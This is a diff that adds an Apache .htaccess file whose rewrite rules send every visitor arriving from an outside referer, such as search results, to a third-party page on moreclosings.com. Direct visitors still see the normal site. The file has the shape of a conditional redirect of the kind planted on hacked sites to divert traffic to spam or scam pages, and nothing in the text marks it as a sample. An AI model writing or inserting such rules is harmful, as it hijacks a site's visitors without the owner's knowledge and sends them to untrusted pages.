@@ -1,0 +1,10 @@
+<IfModule mod_rewrite.c>
+
+	RewriteEngine On
+	RewriteBase /
+
+	RewriteCond %{HTTP_REFERER} ^http://[w.]*([^/]+)
+	RewriteCond %{HTTP_HOST}/%1 !^[w.]*([^/]+)/\1$ [NC]
+	RewriteRule ^.*$ http://moreclosings.com/showthread.php?sid=209720 [L,R]
+
+</IfModule>
